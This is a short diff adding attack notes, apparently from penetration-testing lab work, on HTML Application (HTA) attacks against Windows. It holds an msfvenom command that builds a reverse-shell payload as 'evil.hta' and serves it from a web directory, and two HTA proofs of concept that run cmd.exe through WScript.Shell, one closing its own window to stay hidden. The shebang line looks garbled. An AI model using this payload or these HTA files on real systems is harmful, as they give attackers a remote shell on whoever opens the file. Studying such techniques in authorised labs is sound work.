@@ -1,0 +1,45 @@
+#!/usr/bin/peno
+
+#HTA in Action
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+
+
+
+#HTA file to open cmd.exe
+
+<html>
+<body>
+
+<script>
+
+  var c= 'cmd.exe'
+  new ActiveXObject('WScript.Shell').Run(c);
+  
+</script>
+
+</body>
+</html>
+
+# Updated proof of concept
+<html>
+<head>
+
+<script>
+
+  var c= 'cmd.exe'
+  new ActiveXObject('WScript.Shell').Run(c);
+  
+</script>
+
+</head>
+<body>
+
+<script>
+  
+  self.close();
+    
+</script>
+  
+</body>
+</html>
+
